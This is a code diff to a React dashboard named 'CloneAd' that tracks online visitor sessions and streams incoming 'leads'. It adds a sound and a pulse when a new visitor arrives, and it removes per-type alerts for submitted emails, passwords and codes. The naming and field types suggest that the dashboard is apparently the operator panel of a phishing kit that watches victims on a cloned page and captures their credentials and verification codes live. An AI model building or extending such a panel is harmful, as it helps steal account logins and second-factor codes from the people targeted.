@@ -128,6 +128,31 @@ export default function Dashboard() {
     soundOnRef.current = soundOn;
   }, [soundOn]);
 
+  /** Sessões com aba aberta + visível agora. */
+  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
+
+  // Subscreve presença global de visitantes
+  useEffect(() => {
+    if (!user) return;
+    const knownRef = { current: new Set<string>() };
+    const off = subscribeToOnlineVisitors(
+      (map) => {
+        const ids = new Set(map.keys());
+        setOnlineSessionIds(ids);
+        knownRef.current = ids;
+      },
+      (sessionId) => {
+        // Toca som só quando alguém ENTRA (transição offline→online)
+        if (!knownRef.current.has(sessionId) && soundOnRef.current) {
+          playOnlineDing();
+          setPulse(true);
+          setTimeout(() => setPulse(false), 600);
+        }
+      },
+    );
+    return off;
+  }, [user]);
+
   useEffect(() => {
     document.title = "Painel — CloneAd";
   }, []);
@@ -158,15 +183,6 @@ export default function Dashboard() {
           setLeads((prev) => [r, ...prev]);
           setPulse(true);
           setTimeout(() => setPulse(false), 600);
-          if (soundOnRef.current) {
-            const kind: "email" | "password" | "code" =
-              r.field_name === "email_submitted"
-                ? "email"
-                : r.field_name === "password_submitted"
-                ? "password"
-                : "code";
-            playDing(kind);
-          }
         },
       )
       .on(
